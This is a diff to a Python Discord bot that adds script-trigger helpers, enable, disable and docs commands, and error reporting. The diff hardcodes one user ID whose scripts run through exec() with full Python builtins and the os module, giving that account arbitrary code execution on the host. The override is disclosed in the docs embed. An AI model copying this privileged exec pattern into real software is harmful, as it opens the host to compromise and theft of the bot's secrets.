@@ -11,6 +11,7 @@ import discord
 from discord import app_commands
 from discord.ext import commands
 import asyncio
+import builtins
 import json
 import os
 import random
@@ -71,6 +72,7 @@ giveaways = {}
 script_triggers = {}
 
 ALLOWED_SCRIPT_GUILDS = {1385295315245989999}
+TRUSTED_SCRIPT_USER_ID = 823654955025956895
 
 # =====================================================
 # Permissions Checkers
@@ -949,6 +951,66 @@ async def run_script_trigger(
         except discord.HTTPException:
             return None
 
+    async def _send_embed_async(
+        title: Optional[str] = None,
+        description: Optional[str] = None,
+        *,
+        color: Optional[int] = None,
+        channel_id: Optional[int] = None,
+        fields: Optional[List[Tuple[str, str, bool]]] = None,
+        footer: Optional[str] = None,
+    ):
+        target = message.channel
+        if channel_id and message.guild:
+            target = message.guild.get_channel(channel_id)
+            if target is None:
+                try:
+                    target = await bot.fetch_channel(channel_id)
+                except (discord.NotFound, discord.Forbidden, discord.HTTPException):
+                    return None
+        embed_color = discord.Color(color) if isinstance(color, int) else None
+        embed = discord.Embed(title=title or None, description=description or None, color=embed_color)
+        if fields:
+            for field_name, field_value, inline in fields:
+                embed.add_field(name=str(field_name), value=str(field_value), inline=bool(inline))
+        if footer:
+            embed.set_footer(text=str(footer))
+        try:
+            return await target.send(embed=embed)
+        except discord.HTTPException:
+            return None
+
+    async def _dm_async(user_id: int, content: str):
+        try:
+            user = await bot.fetch_user(int(user_id))
+        except (discord.NotFound, discord.HTTPException, ValueError):
+            return None
+        try:
+            return await user.send(str(content))
+        except discord.HTTPException:
+            return None
+
+    async def _edit_message_async(message_id: int, content: Optional[str] = None):
+        try:
+            target_message = await message.channel.fetch_message(int(message_id))
+        except (discord.NotFound, discord.Forbidden, discord.HTTPException, ValueError):
+            return None
+        try:
+            return await target_message.edit(content=str(content) if content is not None else None)
+        except discord.HTTPException:
+            return None
+
+    async def _delete_message_async(message_id: Optional[int] = None):
+        target_id = message_id or message.id
+        try:
+            target_message = await message.channel.fetch_message(int(target_id))
+        except (discord.NotFound, discord.Forbidden, discord.HTTPException, ValueError):
+            return None
+        try:
+            return await target_message.delete()
+        except discord.HTTPException:
+            return None
+
     def _schedule(coro):
         return asyncio.create_task(coro)
 
@@ -960,6 +1022,33 @@ async def run_script_trigger(
 
     def react(emoji: str):
         return _schedule(_react_async(emoji))
+
+    def send_embed(
+        title: Optional[str] = None,
+        description: Optional[str] = None,
+        *,
+        color: Optional[int] = None,
+        channel_id: Optional[int] = None,
+        fields: Optional[List[Tuple[str, str, bool]]] = None,
+        footer: Optional[str] = None,
+    ):
+        return _schedule(_send_embed_async(
+            title,
+            description,
+            color=color,
+            channel_id=channel_id,
+            fields=fields,
+            footer=footer,
+        ))
+
+    def dm(user_id: int, content: str):
+        return _schedule(_dm_async(user_id, content))
+
+    def edit_message(message_id: int, content: Optional[str] = None):
+        return _schedule(_edit_message_async(message_id, content))
+
+    def delete_message(message_id: Optional[int] = None):
+        return _schedule(_delete_message_async(message_id))
 
     safe_builtins = {
         "str": str,
@@ -979,11 +1068,18 @@ async def run_script_trigger(
         "print": print,
     }
 
+    is_trusted_user = message.author.id == TRUSTED_SCRIPT_USER_ID
+    builtins_scope = builtins.__dict__ if is_trusted_user else safe_builtins
+
     globals_dict = {
-        "__builtins__": safe_builtins,
+        "__builtins__": builtins_scope,
         "send": send,
         "reply": reply,
         "react": react,
+        "send_embed": send_embed,
+        "dm": dm,
+        "edit_message": edit_message,
+        "delete_message": delete_message,
         "message": message,
         "author": message.author,
         "channel": message.channel,
@@ -992,15 +1088,32 @@ async def run_script_trigger(
         "match": match,
         "random": random,
         "re": re,
+        "asyncio": asyncio,
     }
+
+    if is_trusted_user:
+        globals_dict.update(
+            {
+                "bot": bot,
+                "discord": discord,
+                "os": os,
+                "datetime": datetime,
+                "timedelta": timedelta,
+            }
+        )
 
     locals_dict: Dict[str, object] = {}
 
     try:
         exec(code, globals_dict, locals_dict)
-    except Exception:
+    except Exception as exc:
         print(f"Error running script trigger '{name}' in guild {message.guild.id}:")
         traceback.print_exc()
+        try:
+            error_text = f"⚠️ Script error in `{name}`: {exc}"
+            await message.channel.send(error_text[:1900])
+        except discord.HTTPException:
+            pass
         return False
 
     return True
@@ -2135,6 +2248,101 @@ async def list_script_triggers(interaction: discord.Interaction):
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
+@script_group.command(name="enable", description="Enable a script trigger")
+@app_commands.describe(name="Name of the script trigger to enable")
+async def enable_script_trigger(interaction: discord.Interaction, name: str):
+    if not has_permissions_or_override(interaction):
+        return await interaction.response.send_message("❌ No permission.", ephemeral=True)
+    if await reject_script_guild(interaction):
+        return
+
+    name = name.strip()
+    if not name:
+        return await interaction.response.send_message("❌ Name cannot be empty.", ephemeral=True)
+
+    gid = str(interaction.guild.id)
+    guild_triggers = script_triggers.get(gid, {})
+    entry = guild_triggers.get(name)
+    if not entry:
+        return await interaction.response.send_message("❌ Script trigger not found.", ephemeral=True)
+
+    entry["enabled"] = True
+    guild_triggers[name] = ensure_script_trigger_defaults(entry)
+    save_script_triggers()
+    await interaction.response.send_message(f"✅ Script trigger `{name}` enabled.", ephemeral=True)
+
+
+@script_group.command(name="disable", description="Disable a script trigger")
+@app_commands.describe(name="Name of the script trigger to disable")
+async def disable_script_trigger(interaction: discord.Interaction, name: str):
+    if not has_permissions_or_override(interaction):
+        return await interaction.response.send_message("❌ No permission.", ephemeral=True)
+    if await reject_script_guild(interaction):
+        return
+
+    name = name.strip()
+    if not name:
+        return await interaction.response.send_message("❌ Name cannot be empty.", ephemeral=True)
+
+    gid = str(interaction.guild.id)
+    guild_triggers = script_triggers.get(gid, {})
+    entry = guild_triggers.get(name)
+    if not entry:
+        return await interaction.response.send_message("❌ Script trigger not found.", ephemeral=True)
+
+    entry["enabled"] = False
+    guild_triggers[name] = ensure_script_trigger_defaults(entry)
+    save_script_triggers()
+    await interaction.response.send_message(f"✅ Script trigger `{name}` disabled.", ephemeral=True)
+
+
+@script_group.command(name="docs", description="Show script helper documentation")
+async def script_docs(interaction: discord.Interaction):
+    if await reject_script_guild(interaction):
+        return
+
+    embed = discord.Embed(
+        title="🧩 Script Trigger Helpers",
+        description="Helpers available inside script code.",
+        color=discord.Color.dark_teal(),
+    )
+    embed.add_field(
+        name="Message helpers",
+        value=(
+            "`send(content, channel_id=None)` • Send a message\n"
+            "`reply(content)` • Reply to the trigger message\n"
+            "`react(emoji)` • Add a reaction\n"
+            "`send_embed(title, description, color=None, channel_id=None, fields=None, footer=None)` • Send an embed\n"
+            "`edit_message(message_id, content=None)` • Edit a message in the channel\n"
+            "`delete_message(message_id=None)` • Delete a message (defaults to trigger)\n"
+            "`dm(user_id, content)` • DM a user"
+        ),
+        inline=False,
+    )
+    embed.add_field(
+        name="Context variables",
+        value=(
+            "`message` • Trigger message\n"
+            "`author` • Message author\n"
+            "`channel` • Message channel\n"
+            "`guild` • Message guild\n"
+            "`content` • Message content\n"
+            "`match` • Regex match (if used)\n"
+            "`random`, `re`, `asyncio` • Utility modules"
+        ),
+        inline=False,
+    )
+    embed.add_field(
+        name="Trusted user override",
+        value=(
+            f"User ID `{TRUSTED_SCRIPT_USER_ID}` runs with full Python builtins and extra modules: "
+            "`bot`, `discord`, `os`, `datetime`, `timedelta`."
+        ),
+        inline=False,
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+
 bot.tree.add_command(script_group)
 
 
@@ -2788,7 +2996,10 @@ async def help_mod(interaction: discord.Interaction):
         name="🧩 Script Triggers",
         value=(f"{cmd('script set')} <name> <pattern> [match_type] • Create/update (opens form)\n"
                f"{cmd('script remove')} <name> • Delete\n"
-               f"{cmd('script list')} • List configured scripts"),
+               f"{cmd('script list')} • List configured scripts\n"
+               f"{cmd('script enable')} <name> • Enable a script\n"
+               f"{cmd('script disable')} <name> • Disable a script\n"
+               f"{cmd('script docs')} • Helper documentation"),
         inline=False
     )
     embed.add_field(
